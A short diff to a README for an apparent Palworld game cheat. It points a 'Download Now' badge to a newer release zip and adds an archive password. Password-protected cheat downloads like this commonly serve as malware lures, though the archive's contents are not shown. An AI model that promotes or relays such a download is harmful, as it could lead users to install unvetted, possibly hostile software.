@@ -29,13 +29,13 @@
 ## 📥 Download
 
 <p align="center">
-  <a href="https://github.com/BrightStokerHum/Palworld-Extreme-Hack/releases/download/4/PalworldExtreme.zip">
+  <a href="https://github.com/BrightStokerHum/Palworld-Extreme-Hack/releases/download/5/PalworldExtreme.zip">
     <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-000000?style=for-the-badge&logo=github&logoColor=white" alt="Download">
   </a>
 </p>
 
 
-
+## Password: Extreme2026
 ---
 
 ## ✨ Features
